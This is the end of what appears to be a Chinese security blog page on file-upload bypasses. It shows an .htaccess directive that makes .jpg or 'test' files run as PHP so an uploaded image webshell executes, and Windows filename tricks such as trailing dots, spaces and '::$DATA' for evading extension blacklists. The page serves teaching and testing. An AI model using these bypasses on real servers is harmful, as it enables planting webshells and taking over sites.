+    <a href="#%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6" class="header-mark"></a>配置文件</h3><h4 id="htaccess" class="headerLink">
+    <a href="#htaccess" class="header-mark"></a>.htaccess</h4><p>.htaccess(或者&quot;分布式配置文件&quot;）是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。可以通过上传.htaccesss，其内容为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">AddType</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">httpd</span><span class="o">-</span><span class="nx">php</span>  <span class="o">.</span><span class="nx">jpg</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将所有的.jpg 格式当成 php 解析，然后再上传图片马即可实现绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">FilesMatch</span> <span class="s2">&#34;test&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">SetHandler</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">httpd</span><span class="o">-</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="nx">FilesMatch</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者指定特定文件（如 test）来解析</p>
+</br>
+<h2 id="操作系统相关" class="headerLink">
+    <a href="#%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e7%9b%b8%e5%85%b3" class="header-mark"></a>操作系统相关</h2><h3 id="windows" class="headerLink">
+    <a href="#windows" class="header-mark"></a>windows</h3><p>不符合windows文件命名规则的文件名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">test</span><span class="o">.</span><span class="nx">asp</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="nx">test</span><span class="o">.</span><span class="nx">asp</span><span class="p">(</span><span class="nx">空格</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">test</span><span class="o">.</span><span class="nx">asp</span><span class="o">.</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="nx">test</span><span class="o">.</span><span class="nx">php</span><span class="o">:</span><span class="mf">1.</span><span class="nx">jpg</span>
+</span></span><span class="line"><span class="cl"><span class="nx">test</span><span class="o">.</span><span class="nx">php</span><span class="o">::</span><span class="nv">$DATA</span>
+</span></span><span class="line"><span class="cl"><span class="nx">shell</span><span class="o">.</span><span class="nx">php</span><span class="o">::</span><span class="nv">$DATA……</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>windows会默认不符合命名规范的文件名内容（如自动去掉后缀名中最后的<code>.</code>和<code>空格</code>），因此上传的时候可以用 burp suite 在文件名加上空格或点，逃逸黑名单。而上传之后，windows会自动把空格或点去掉。</p>
+<p>php在window的时候，如果文件名 + <code>::$DATA</code> 会把<code>::$DATA</code>之后的数据当成文件流处理，不会检测后缀名。且保持<code>::$DATA</code>之前的文件名。</p>
+</div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-07-24</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="prev" rel="prev" title="文件包含"><i class="fas fa-angle-left fa-fw"></i>文件包含</a>
+            <a href="/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" class="next" rel="next" title="命令注入">命令注入<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.96.0">Hugo</a> 强力驱动&nbsp;|&nbsp;主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.13"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">高诺琪</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/fuse/fuse.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/topbar/topbar.min.js"></script><script type="text/javascript" src="/lib/pjax/pjax.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+
+<div class="pjax-assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":true,"location":0,"maxResultLength":6,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":10,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"table":{"sort":true}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript></div>
+</body>
+
+</html>
